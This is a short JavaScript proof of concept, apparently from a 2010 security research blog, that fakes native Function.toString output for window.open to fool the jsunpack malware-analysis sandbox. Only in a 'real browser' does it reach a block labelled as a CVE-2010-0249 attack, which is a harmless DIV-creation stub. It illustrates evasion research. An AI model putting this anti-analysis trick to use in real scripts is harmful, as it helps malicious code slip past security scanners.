// recursive Function.toString() emulation
// @author Krzysztof kotowicz - krzysztof at kotowicz dot net
// @see http://blog.kotowicz.net/2010/06/ultimate-tostring-override.html

var emulateToStringRecursive = function(object, fn_header) {
	object.__defineGetter__("toString", function() {
		var original = this.__proto__.toString;
	
		this.__proto__.toString = function() {
			var a = original.call(this);

                        if (a.match("_JSUNPACK_RANDOMIZE_ME"))
				return original.toString();
			return a;
		};

		return function() {
			// dummy operation to avoid removal by the optimizer
			["_JSUNPACK_RANDOMIZE_ME"] 
			var BODY = " {\n\t[native code]\n}";
			return fn_header + BODY;
		}
	 });
};

emulateToStringRecursive(window.open, 'function open()');

window.test = function dd() {
  return 'test';
};

function log(n1,n2) {
 var i = document.getElementById('log');
 i.innerHTML += "\n"+ n1+"\n"+n2+"\n\n";
}

log('window.test.toString()',window.test.toString());
log('window.open.toString()',window.open.toString());
log('window.test.toString()',window.test.toString());
log('window.open.toString()',window.open.toString());
log('window.open.toString.toString()',window.open.toString.toString());
log('window.open.toString.toString.toString()',window.open.toString.toString.toString());
log('window.open.toString.toString.toString.toString()',window.open.toString.toString.toString.toString());

fake_browser = false;
fake_browser = (window.open.toString().match(/print/));
if (!fake_browser) {
  log("real browser detected, launching attack","");
  // CVE-2010-0249 MSIEUseAfterFree
  var i2;
  for (var i = 0; i < 10000; i++) {
     i2=document.createElement('DIV');
     i2.innerHTML = i;
     document.body.appendChild(i2);
  }
}
